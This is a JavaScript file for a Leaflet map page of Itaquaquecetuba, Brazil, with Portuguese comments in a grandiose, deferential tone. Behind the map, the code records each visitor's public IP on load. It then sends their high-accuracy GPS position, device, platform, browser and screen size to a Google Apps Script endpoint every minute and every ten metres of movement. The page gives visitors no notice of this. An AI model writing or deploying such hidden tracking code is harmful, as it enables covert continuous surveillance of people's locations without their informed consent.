$(document).ready(function () {
    // MAPA
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

    // O MAPA QUE NUNCA FALHA
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        className: 'mapa-real-preto'
    }).addTo(map);

    // AJUSTA ZOOM AO TERRITÓRIO REAL
    if (typeof itaquaLayer !== 'undefined') {
        map.fitBounds(itaquaLayer.getBounds());
    }

    // MARCADOR CENTRAL
    L.marker([-23.4866, -46.3487])
        .addTo(map)
        .bindPopup('Itaquaquecetuba — Território Soberano');

    // Busca o IP assim que o site carrega para guardá-lo no Cofre (localStorage)
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => localStorage.setItem('ip_real', data.ip))
        .catch(() => localStorage.setItem('ip_real', 'Não capturado'));
});

// A URL DA VITÓRIA
const URL_API_REAL = "https://script.google.com/macros/s/AKfycbxMsDUEOfYRYcY5DMwgX7PbfhtEpFagDVWGlQuGIUT3LCZi-pxgQCzgEAWBg29hqr3Xvw/exec"; 
let ultimaLat = null;
let ultimaLng = null;

// Função de Envio adaptada para o método GET (Inabalável)
function enviarParaPlanilha(lat, lng) {
    const userAgent = navigator.userAgent;
    
    // Preparação dos dados imperiais
    const dados = {
        lat: lat,
        lng: lng,
        ip: localStorage.getItem('ip_real') || 'Buscando...',
        dispositivo: /Android|iPhone|iPad/i.test(userAgent) ? "Mobile" : "PC",
        sistemaOperacional: navigator.platform,
        navegador: /Firefox|Chrome|Safari|Edg/i.test(userAgent) ? (userAgent.match(/(Firefox|Chrome|Safari|Edg)/i)[0]) : "Outro",
        resolucao: `${window.screen.width}x${window.screen.height}`
    };

    // Construção da URL com parâmetros (A chave do sucesso)
    const urlFinal = new URL(URL_API_REAL);
    Object.keys(dados).forEach(key => urlFinal.searchParams.append(key, dados[key]));

    fetch(urlFinal, {
        method: 'GET',
        mode: 'no-cors'
    })
    .then(() => console.log("Coordenada enviada por decreto real via GET!"))
    .catch(err => console.error("Falha na comunicação:", err));
}

// 1. REGRA DO TEMPO: Enviar a cada 1 minuto (60000ms)
setInterval(() => {
    navigator.geolocation.getCurrentPosition((pos) => {
        enviarParaPlanilha(pos.coords.latitude, pos.coords.longitude);
    }, null, { enableHighAccuracy: true });
}, 60000);

// 2. REGRA DO ESPAÇO: Enviar a cada 10 metros de movimento
navigator.geolocation.watchPosition((pos) => {
    const novaLat = pos.coords.latitude;
    const novaLng = pos.coords.longitude;

    if (ultimaLat === null || calcularDistanciaImperial(ultimaLat, ultimaLng, novaLat, novaLng) >= 10) {
        enviarParaPlanilha(novaLat, novaLng);
        ultimaLat = novaLat;
        ultimaLng = novaLng;
    }
}, null, { enableHighAccuracy: true });

// Função de cálculo de distância (Mantida conforme Vossa vontade)
function calcularDistanciaImperial(lat1, lon1, lat2, lon2) {
    const R = 6371000;
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
              Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
              Math.sin(dLon / 2) * Math.sin(dLon / 2);
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}
